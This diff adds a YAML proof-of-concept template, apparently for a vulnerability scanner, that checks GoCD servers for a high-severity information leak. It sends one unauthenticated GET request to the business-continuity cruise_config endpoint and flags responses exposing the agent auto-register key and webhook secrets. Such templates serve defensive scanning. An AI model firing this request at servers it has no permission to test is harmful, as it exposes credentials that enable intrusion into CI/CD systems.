@@ -1,0 +1,17 @@
+id: poc-yaml-gocd-cruise-config-info-leak
+info:
+  name: GoCD Cruise Configuration 信息泄露漏洞
+  severity: high
+  finger: GoCD
+  tags:
+  - 信息泄露
+  osprey-id: vb_2022_0054
+requests:
+- method: GET
+  path: /go/add-on/business-continuity/api/cruise_config
+  expression: 'status_code == 200 && contains(body, "server agentAutoRegisterKey")
+    && contains(body, "webhookSecret")
+
+    '
+variables: {}
+transport: http
